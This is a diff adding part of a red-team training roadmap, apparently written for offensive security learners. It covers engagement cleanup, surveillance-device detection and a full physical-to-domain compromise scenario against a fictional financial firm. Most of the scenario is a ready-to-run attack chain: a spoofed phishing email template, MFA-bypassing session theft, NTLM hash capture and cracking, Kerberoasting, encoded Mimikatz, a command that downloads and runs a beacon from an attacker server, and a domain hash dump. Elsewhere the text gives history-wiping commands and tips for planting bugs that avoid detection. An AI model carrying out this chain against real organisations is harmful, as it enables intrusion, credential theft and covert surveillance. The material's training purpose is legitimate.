+| F-007 | Medium | ✗ OPEN | No action taken |
+```
+
+---
+
+## SECTION 5: POST-ENGAGEMENT CLEANUP
+
+```
+RULE: Leave the target in better shape than you found it.
+      Every implant you forget is a backdoor for the next person.
+      Clean exits protect you and protect the client.
+
+---
+
+CHECKLIST: FULL CLEANUP:
+
+NETWORK IMPLANTS:
+  [ ] LAN Turtle removed + factory reset
+  [ ] Bash Bunny removed
+  [ ] Packet Squirrel removed
+  [ ] Any rogue WiFi AP (Pineapple) removed + reset
+  [ ] PowerShell Empire / Sliver / Cobalt Strike beacons killed
+  [ ] All C2 callback domains: notify client, pull down DNS
+  [ ] VPS used for C2: wipe or destroy
+  [ ] Firewall rules on VPS: remove
+
+HOST ARTIFACTS (Windows targets):
+  # Clear PowerShell history:
+  Remove-Item "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" -Force
+  
+  # Clear prefetch:
+  Remove-Item "C:\Windows\Prefetch\*" -Force 2>$null
+  
+  # Clear temp files:
+  Remove-Item "$env:TEMP\*" -Recurse -Force 2>$null
+  
+  # Remove dropped executables (your payloads):
+  # [List all dropped files from your operation notes]
+  Remove-Item "C:\Users\Public\[payload.exe]" -Force
+  
+  # Clear Windows Event Log (only if authorized as destructive test):
+  # DO NOT clear logs without explicit authorization in SOW
+  # wevtutil cl System
+  # wevtutil cl Security
+  # wevtutil cl Application
+  
+  # Remove scheduled tasks created:
+  Unregister-ScheduledTask -TaskName "[YOUR TASK]" -Confirm:$false
+  
+  # Remove registry keys created for persistence:
+  Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "[YOUR KEY]" -Force
+  
+  # Remove added local accounts:
+  Remove-LocalUser -Name "[YOUR USER]"
+
+HOST ARTIFACTS (Linux targets):
+  # Clear bash history:
+  history -c
+  cat /dev/null > ~/.bash_history
+  
+  # Clear auth.log entries for your IPs (only if explicitly authorized):
+  # Do NOT clear logs without authorization
+  
+  # Remove cron jobs:
+  crontab -l | grep -v "[YOUR ENTRY]" | crontab -
+  
+  # Remove dropped files:
+  rm -rf /tmp/[your files] /var/tmp/[your files]
+  
+  # Remove added users:
+  userdel -r [ADDED USER]
+  
+  # Remove SSH keys added to authorized_keys:
+  sed -i '/[YOUR KEY COMMENT]/d' /root/.ssh/authorized_keys
+  sed -i '/[YOUR KEY COMMENT]/d' /home/*/\.ssh/authorized_keys 2>/dev/null
+
+ACTIVE DIRECTORY (domain-level):
+  [ ] Remove any computer accounts created (fake endpoints used as C2)
+  [ ] Remove any user accounts created
+  [ ] Remove Golden/Silver Ticket material (change KRBTGT password: coordinate with client)
+  [ ] Remove any GPO modifications
+  [ ] Remove any group membership changes
+  [ ] Remove any ADCS templates modified (ADCS ESC attacks)
+  [ ] Remove BloodHound/SharpHound data collection artifacts
+      [typically: collection files in %TEMP% on collector machine]
+
+PHYSICAL:
+  [ ] All hardware implants retrieved and inventoried
+  [ ] Cloned badge cards destroyed
+  [ ] Any printed pretext documents shredded
+  [ ] Burner phone SIMs destroyed (not reused)
+  [ ] Operation photos / notes encrypted or destroyed per data handling agreement
+
+FINAL VERIFICATION:
+  [ ] C2 server shows zero active beacons
+  [ ] All dropped tool hashes provided to client SOC for allowlist removal
+  [ ] All C2 callback domains provided to client for DNS monitoring removal
+  [ ] Engagement data encrypted and stored per data handling agreement
+  [ ] Re-test date confirmed
+```
+
+---
+
+## SECTION 6: TSCM - FINDING BUGS TO PLANT THEM
+
+```
+TECHNICAL SURVEILLANCE COUNTERMEASURES:
+  The science of detecting surveillance devices.
+  Why operators learn this: understanding HOW bugs work teaches you 
+  to plant ones that evade detection.
+
+COMMON SURVEILLANCE DEVICES AND THEIR SIGNATURES:
+
+RF BUGS (wireless audio/video transmitters):
+  Signature: RF emission in VHF (88-500MHz), UHF (500MHz-3GHz), or 2.4GHz/5.8GHz bands
+  Detection: spectrum analyzer sweep of the space
+  Tool: RF Explorer handheld spectrum analyzer ($130-200, rfexplorer.com)
+  Method: walk room slowly with RF Explorer → any unexplained signal source = anomaly
+  Common frequencies: 88-108MHz (FM band), 433MHz (ISM), 900MHz (GSM), 2.4GHz (WiFi)
+
+GSM/4G BUGS (cellular audio transmitters, most modern):
+  Signature: periodic cellular uplink burst (very short, hard to catch passively)
+  Detection: IMSI catcher or dedicated GSM bug detector
+  Tool: RF Explorer + dedicated GSM band monitoring
+  Alternative: cell signal strength map of the room: unexplained strong signal source
+
+LASER MICROPHONES:
+  No RF emissions: undetectable by RF sweep
+  Detection: vibration isolation, window film (changes reflection)
+  Tell: if a meeting room has a window with clear line-of-sight from outside = risk
+
+NETWORK HARDWARE:
+  Rogue AP in the room (could be YOUR LAN Turtle equivalent, planted by adversary)
+  Detection: WiFi survey (NetSpot, inSSIDer): any unexpected SSID or BSSID
+  Physical inspection: any ethernet device you don't recognize
+
+VISUAL INSPECTION METHODOLOGY:
+  1. Unplug everything not needed and identify every device that remains powered
+  2. Check: smoke detectors, electrical outlets, USB chargers, clocks
+     These are the most common commercial bug housings
+  3. Use non-linear junction detector (NLJD) if available: detects semiconductor junctions
+     even when device is powered off (Lornet ELITE: $3,000+, professional grade)
+  4. Conduct sweep with lights off using near-IR flashlight:
+     Camera lenses reflect near-IR distinctly → any tiny bright spot = possible lens
+
+WHAT THIS TEACHES ABOUT OFFENSIVE PLANTING:
+  The best bugs are:
+  - On infrastructure nobody inspects (inside existing devices, junction boxes)
+  - Passive (not transmitting constantly): duty cycle reduces RF detectability
+  - GSM/LTE based (not WiFi: WiFi is too visible in standard network surveys)
+  - Physically disguised as legitimate infrastructure
+  → These are the same principles behind legitimate physical red team implants
+```
+
+---
+
+## SECTION 7: THE FULL OPERATIONAL SCENARIO
+
+> This is the section that ties everything in the roadmap together. Every technique here references a prior phase. Run this scenario in a lab first. Then in a legal, authorized engagement.
+
+---
+
+### Operation: SILENT LEDGER
+**Scenario:** Full physical-to-domain compromise of a mid-size financial firm.
+**Duration:** 5 days
+**Objective:** Achieve Domain Admin access and simulate exfiltration of financial records.
+**Authorization:** Full physical + phishing + technical in scope.
+
+---
+
+#### Day 0 - Intelligence Package
+
+```
+PASSIVE OSINT (from your desk, no network activity against target):
+
+1. LinkedIn scrape:
+   Tool: LinkedInDumper or manual enumeration
+   Result: 340 employees identified, 6 in IT department named, 
+           hiring manager for "Security Operations" found
+   Email format: identified from HunterIO as [first].[last]@targetco.com
+
+2. Shodan/Censys:
+   Target range: targetco.com → resolve → IP block found
+   Shodan: "org:TargetCo" → 3 open management interfaces found
+   - https://vpn.targetco.com (Pulse Secure: check version)
+   - https://mail.targetco.com (Exchange OWA)
+   - https://remote.targetco.com (Citrix)
+
+3. Breach database check:
+   Tool: DeHashed, LeakCheck, or manual HIBP API
+   Result: 2 accounts from 2021 LinkedIn breach: 
+           j.carter@targetco.com + password hash
+           m.rodriguez@targetco.com + cleartext password
+
+4. Google Street View reconnaissance:
+   HQ at 1500 Market St → badge reader: HID ProxPoint Plus (125kHz: cloneable)
+   Entrance: single badge reader, security desk at far right, 2 cameras (door + lobby)
+   Side entrance: loading dock on east side, no camera above dock door
+   
+5. Job posting analysis:
+   "Lenel S2 access control experience preferred" → access control brand confirmed
+   "Manage CrowdStrike EDR deployment" → EDR is CrowdStrike Falcon
+   "Office 365 / Azure AD administration" → M365 tenant confirmed
+
+6. Email security check:
+   dig TXT targetco.com | grep spf → SPF found
+   Check DMARC: dig TXT _dmarc.targetco.com → p=quarantine (not reject)
+   Check DKIM: mail-tester.com test → DKIM pass
+   Note: DMARC policy is quarantine (not reject) → spoofed emails may land in spam,
+         but IT/security-themed phish from reputable IP often gets through
+```
+
+#### Day 1 - Initial Access (Phishing)
+
+```
+CAMPAIGN SETUP:
+  
+  Domain: targetco-itsupport.com (registered 30 days prior)
+  SSL: Let's Encrypt cert (free) → looks legitimate
+  Redirector: Apache mod_rewrite on VPS → forwards to Evilginx3 on separate VPS
+  
+  Evilginx3 phishlet: Microsoft 365 (built-in phishlet)
+  Target: M365 login page for targetco.com tenant
+  Result: captures session cookies (bypasses MFA entirely: AiTM attack)
+
+EMAIL CAMPAIGN:
+  From: IT Security <security@targetco-itsupport.com>
+  Display name spoofing: "IT Security Team <security@targetco.com>" 
+  (domain in display name ≠ actual sending domain: passes visual inspection)
+  
+  Subject: ACTION REQUIRED: Suspicious Login Detected on Your Account
+  
+  Body:
+  "We've detected a login attempt from an unrecognized device (Moscow, RU)
+  at 2:14 AM. If this was not you, please verify your account immediately
+  to prevent suspension: [LINK TO EVILGINX3 PHISHING PAGE]"
+
+  Target selection: 15 employees in Finance and IT
+  Sent via: GoPhish + SMTP relay from SendGrid (authenticated)
+
+RESULTS (6 hours later):
+  7/15 clicked the link
+  4/15 entered credentials on the phishing page
+  Evilginx3 captured: session cookies for all 4
+  
+  → Import cookies to browser extension (Cookie-Editor)
+  → Authenticated as jcarter@targetco.com: no MFA prompt
+  → J. Carter is a Senior Financial Analyst
+  → Access: SharePoint, Teams, Exchange, Power BI
+
+PHASE 4F CONFLUENCE:
+  Enumerate from M365 foothold:
+  # Using GraphAPI with stolen cookie:
+  curl -H "Authorization: Bearer [TOKEN]" \
+    https://graph.microsoft.com/v1.0/me/memberOf
+  # J. Carter is member of: Finance-All, SharePoint-Finance, Board-Reports-Reader
+  
+  # Find more users and their MFA status:
+  curl -H "Authorization: Bearer [TOKEN]" \
+    https://graph.microsoft.com/v1.0/users?$select=displayName,userPrincipalName,assignedLicenses
+```
+
+#### Day 1 (Evening) - Physical Entry
+
+```
+PREPARATION:
+  Time: 5:15 PM (peak exit flow: employees leaving → door opens constantly)
+  Attire: business casual matching LinkedIn office photos (no tie, oxford shirt)
+  Props: laptop bag, takeout coffee cup, fake HID badge (blank card in same lanyard
+         color as observed on LinkedIn photos)
+  Transport: Uber drop-off 1 block away (not recorded in parking)
+  
+  Hardware prepared:
+    LAN Turtle: pre-configured with autossh → your VPS (tested at home)
+    Bash Bunny: PowerShell payload loaded (downloads Sliver beacon on execution)
+    Burner phone: O.MG cable charges from it (WiFi hotspot for remote trigger)
+
+ENTRY SEQUENCE:
+  17:12: Arrive at loading dock (east side)
+  17:13: Loading dock door: propped open by smokers (observed during drone recon)
+  17:14: Walk through dock into freight elevator
+  17:15: Reach floor 3 (IT department, identified from LinkedIn: "3rd floor is IT")
+  17:16: Navigate to server room (found: door visible from elevator, labeled IDF-3)
+  17:17: Server room door: keypad + badge reader
+           → Use bypass spatula on handle side: interior lever visible through door gap
+           → Under-door tool inserted: lever depressed → door opens (20 seconds)
+  17:18: Inside IDF-3:
+           LAN Turtle deployed between switch port E-23 and cable
+           [PHOTO DOCUMENTED: exact port, cable label]
+  17:21: Exit IDF-3, door pulled closed (latches)
+  17:22: Pass through freight elevator → loading dock → exit
+  17:24: Clear of building
+
+ABORT SCENARIOS THAT DIDN'T TRIGGER (documented for report):
+  No challenge at loading dock (dock worker present, did not question)
+  No camera coverage above freight elevator (drone recon confirmed)
+  No motion sensor in IDF-3 (physical survey by drone showed no PIR)
+```
+
+#### Day 2 - Network Exploitation from Implant
+
+```
+CONNECT TO IMPLANT:
+# From anywhere in the world:
+ssh -p 2222 root@YOUR_VPS_IP
+# → You're inside TargetCo's network via LAN Turtle
+
+# LAN Turtle is on VLAN 10 (corporate LAN: same as workstations)
+# Your implant appears as: MAC from switch port E-23
+
+# Discovery from implant:
+nmap -sn 10.0.0.0/24 -oG - | grep Up | awk '{print $2}'
+# → 187 live hosts discovered
+
+# Responder (credential capture: LLMNR/NBT-NS poisoning):
+python3 Responder.py -I eth0 -wrfv
+# Result after 45 minutes: 3 NTLMv2 hashes captured from passing auth traffic
+# user: svc_backup → hash captured
+
+# Crack hash offline:
+hashcat -m 5600 svc_backup_hash.txt rockyou.txt -r best64.rule
+# Password found: svc_backup : Backup2024!
+
+PHASE 4I: ACTIVE DIRECTORY:
+# Validate credentials:
+netexec smb 10.0.0.10 -u svc_backup -p 'Backup2024!' -d TARGETCO
+# Status: PWNED: svc_backup is valid on DC
+
+# Check privileges:
+netexec ldap 10.0.0.10 -u svc_backup -p 'Backup2024!' --groups
+# svc_backup member of: Backup Operators, Server Operators
+
+# Backup Operators → can BACKUP the SAM/NTDS.dit:
+# This is a full DC compromise path
+
+# Request Kerberoastable accounts:
+GetUserSPNs.py TARGETCO/svc_backup:'Backup2024!' -dc-ip 10.0.0.10 -request
+# Found: MSSQLSvc/sqlserver.targetco.com:1433 → hash for SVC_MSSQL
+
+# Crack MSSQL service account:
+hashcat -m 13100 mssql_hash.txt rockyou.txt
+# Password found: SVC_MSSQL : Sql@Server2023
+
+# MSSQL service account → xp_cmdshell → code execution on SQL server:
+netexec mssql 10.0.0.20 -u SVC_MSSQL -p 'Sql@Server2023' -x "whoami"
+# Output: targetco\SVC_MSSQL (running as SYSTEM on SQL server)
+
+# Dump SAM from SQL server (local admin):
+netexec mssql 10.0.0.20 -u SVC_MSSQL -p 'Sql@Server2023' -x \
+  "powershell -enc [BASE64 ENCODED INVOKE-MIMIKATZ]"
+# Captured: LOCAL ADMIN hash from SQL server
+
+# Pivot: local admin hash → pass-the-hash to workstations:
+netexec smb 10.0.0.0/24 -u administrator -H [LOCAL ADMIN HASH] --local-auth
+# 23 workstations respond: local admin hash reused (Finding: credential reuse)
+
+# Target a domain user on one of those workstations:
+# Deploy Sliver beacon via WMI:
+wmiexec.py TARGETCO/administrator@10.0.0.45 -hashes ':HASH' \
+  "powershell -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://YOUR_VPS/sliver.ps1')"
+# Sliver callback received
+```
+
+#### Day 3 - Domain Compromise
+
+```
+FROM SLIVER BEACON (inside workstation of Domain User):
+
+# Sliver: run SharpHound (BloodHound data collector)
+execute-assembly SharpHound.exe -c All --zipfilename bloodhound.zip
+# Download bloodhound.zip → import to BloodHound
+# BloodHound shows: shortest path to Domain Admin = 3 hops through 
+#   svc_backup → Backup Operators → DCSync rights
+
+# BACKUP OPERATORS → DC REGISTRY DUMP (no DCSync needed):
+# Backup Operators can read the registry including SAM/SYSTEM/SECURITY
+reg.py TARGETCO/svc_backup:'Backup2024!'@10.0.0.10 \
+  save HKLM/SYSTEM /tmp/SYSTEM.save
+reg.py TARGETCO/svc_backup:'Backup2024!'@10.0.0.10 \
+  save HKLM/SAM /tmp/SAM.save
+reg.py TARGETCO/svc_backup:'Backup2024!'@10.0.0.10 \
+  save HKLM/SECURITY /tmp/SECURITY.save
+
+# Dump hashes from registry files:
+secretsdump.py -sam /tmp/SAM.save -system /tmp/SYSTEM.save -security /tmp/SECURITY.save LOCAL
+# Output includes: DPAPI master keys, local admin hash
+# Also: DOMAIN CACHED CREDENTIALS (MSCACHEv2 hashes)
+
+# With SYSTEM on DC path via Backup Operators:
+# Extract NTDS.dit directly:
+reg.py TARGETCO/svc_backup:'Backup2024!'@10.0.0.10 backup -o /tmp/ntds_backup/
+# ntds.dit saved → secretsdump.py → ALL DOMAIN HASHES EXTRACTED
+
+# All 340 domain accounts cracked offline:
+hashcat -m 1000 ntds.hashes.txt rockyou.txt
+
+# Domain Admin obtained
+# Objective: COMPLETE
+
+SIMULATE RANSOMWARE (if in scope per SOW):
+  Create test directory on file server: \\FILESERVER\test-red-team-encryption\
+  Copy 50 sample documents (not real sensitive data unless authorized)
+  Encrypt directory with test key (AES-256, key escrowed for proof)
+  Leave README: "THIS IS A RED TEAM SIMULATION - KEY: [KEY]"
+  Photo as evidence
+  RESTORE immediately after documentation
+```
+
+#### Day 4-5 - Documentation, Cleanup, Report
+
+```
+DOCUMENTATION ARTIFACTS COLLECTED:
+  □ Screenshots: every command with timestamp + system prompt showing domain
+  □ Evilginx3 captures: session cookie acquisition proof
+  □ LAN Turtle: photo of deployment location
+  □ BloodHound graph: attack path exported as PNG
+  □ Credential extraction: partial NTDS hash list (redacted for report)
+  □ File server access: directory listing of accessed path
+  □ Ransomware simulation: before/after photos + encryption key
+
+CLEANUP (see Section 5 checklist):
+  □ Sliver beacon killed
+  □ LAN Turtle retrieved (physical: returned to client at debrief or destroyed)
+  □ All created files removed
+  □ All scheduled tasks removed
+  □ IOCs documented: C2 domain, Sliver payload hashes
+
+OPERATION SILENT LEDGER: FINDING SUMMARY:
+
+| ID | Finding | Path | Severity |
+|----|---------|------|----------|
+| F-001 | AiTM phishing bypasses MFA | Evilginx3 → session cookie | Critical |
+| F-002 | LLMNR/NBT-NS not disabled | Responder → NTLMv2 capture | Critical |
+| F-003 | Backup Operators has DC registry access → full domain compromise | AD privilege | Critical |
+| F-004 | Local admin password reuse across 23 workstations | Lateral movement | High |
+| F-005 | MSSQL service account weak password | Kerberoast → crack in 2h | High |
+| F-006 | Loading dock propped open: no secondary access control | Physical | High |
+| F-007 | IDF-3 door vulnerable to under-door bypass | Physical | High |
+| F-008 | DMARC policy quarantine (not reject): enables phishing delivery | Email | Medium |
+```
+
+---
+
+## APPENDIX: PHASE 6 RESOURCE REFERENCE
+
+### Physical Red Team
+
+| Resource | Type | URL / Source |
+|----------|------|--------------|
+| LockPickingLawyer | YouTube channel | youtube.com/@LockPickingLawyer |
+| BosnianBill | YouTube channel | youtube.com/@BosnianBill |
+| r/lockpicking | Community + belt ranking | reddit.com/r/lockpicking |
+| Sparrows Lockpicks | Equipment | sparrowslockpicks.com |
+| Proxmark3 RDV4 | Equipment | proxmark.com |
+| Hak5 gear (LAN Turtle, Pineapple) | Equipment | hak5.org |
+| Covert Instruments | Equipment | covertinstruments.com |
+| "The Art of Intrusion" - Kevin Mitnick | Book | Standard reference |
+| "Social Engineering" - Christopher Hadnagy | Book | Standard reference |
+| ESP-RFID-Tool firmware | GitHub | github.com/rfidresearchgroup/esp-rfid-tool |
+
+### Quantum / PQC
+
+| Resource | Type | URL |
+|----------|------|-----|
+| NIST PQC Documentation | Official standard | csrc.nist.gov/Projects/post-quantum-cryptography |
+| Open Quantum Safe (liboqs) | Library + bindings | github.com/open-quantum-safe/liboqs |
+| pyoqs (Python bindings) | pip install pyoqs | - |
+| CRYSTALS-Kyber spec | Academic paper | pq-crystals.org/kyber |
+| "Post-Quantum Cryptography" - Bernstein/Lange | Book | pqcrypto.org |
+| Cloudflare PQC Blog | Articles | blog.cloudflare.com (search: post-quantum) |
+| SNDL threat briefings | NSA/CISA | cisa.gov/quantum |
+
+### Red Team Operations
+
+| Resource | Type | URL |
+|----------|------|-----|
+| MITRE ATT&CK | Framework | attack.mitre.org |
+| Atomic Red Team | Test library | github.com/redcanaryco/atomic-red-team |
+| VECTR (report tracking) | Platform | github.com/SecurityRiskAdvisors/VECTR |
+| PlexTrac (report writing) | Platform | plextrac.com |
+| Sigma Rules | Detection rules | github.com/SigmaHQ/sigma |
+| "Red Team Development and Operations" - Joe Vest | Book | Standard reference |
+| "The Hacker Playbook 3" - Peter Kim | Book | Standard reference |
+| Pentest-Standard.org | Methodology | pentest-standard.org |
+
+---
+
+## PHASE 6 COMPETENCY CHECKLIST
+
+Check each off when you can execute from memory without reference:
+
+### Physical Red Team
+- [ ] Pick a 5-pin standard lock via SPP in under 5 minutes
+- [ ] Pick a lock with spool security pins (false set → correction → open)
+- [ ] Shim a spring-latch padlock in under 30 seconds
+- [ ] Clone an HID card using Flipper Zero end-to-end
+- [ ] Clone an HID card using Proxmark3 with lf hid commands
+- [ ] Run hf mf autopwn on a MIFARE Classic card and clone the result
+- [ ] Deploy an ESP-RFID-Tool on Wiegand wiring and extract credential data
+- [ ] Deploy a LAN Turtle with autossh callback to a VPS
+- [ ] Execute a tailgate entry during a documented authorized engagement
+- [ ] Conduct a vendor pretext entry during a documented authorized engagement
+- [ ] Conduct a drone recon flight and produce an annotated aerial photo
+- [ ] Produce a hardware implant deployment report with evidence
+
+### Social Engineering
+- [ ] Execute an authorized vishing call as IT Support
+- [ ] Execute an authorized vishing call as a target-side user to IT
+- [ ] Build a credible LinkedIn identity legend (60+ days aged)
+- [ ] Set up a phishing domain with correct SPF/DKIM/DMARC
+- [ ] Run a GoPhish + Evilginx3 AiTM campaign in a lab environment
+
+### Quantum Computing
+- [ ] Explain Shor's algorithm and which algorithms it breaks (verbal, no notes)
+- [ ] Explain why AES-256 survives Grover's (verbal, no notes)
+- [ ] Explain the SNDL threat model to a non-technical executive
+- [ ] Set up a Zeek + tcpdump SNDL collection pipeline in a lab
+- [ ] Audit a target TLS endpoint and classify quantum vulnerability (using the script above)
+- [ ] Explain ML-KEM, ML-DSA, SLH-DSA and their roles (verbal, no notes)
+- [ ] Explain the PQC downgrade attack to a peer
+
+### Red Team Ops
+- [ ] Complete the scoping questionnaire for a hypothetical engagement
+- [ ] Draft an ROE document from the template
+- [ ] Write an attack narrative for a lab engagement
+- [ ] Write three findings with CVSS scoring and MITRE mapping
+- [ ] Draft a remediation roadmap with priorities and timelines
+- [ ] Deliver a 10-minute debrief to a non-technical audience (practice on family/friends)
+- [ ] Execute a complete cleanup procedure post-lab engagement
+- [ ] Draft a purple team execution document for 5 techniques
+
+### Full Scenario
+- [ ] Complete Operation Silent Ledger end-to-end in an authorized lab/environment
+- [ ] Produce a complete report from the operation including executive summary,
+      attack narrative, and findings with remediation
+
+---
+
+*Phase 6 - v4.5 | 2027 | Author: Sagar Biswas*
+*The GREATEST physical operator is invisible not because nobody saw them, but because nobody remembers they were there.*
+
+---
 
 ---
 
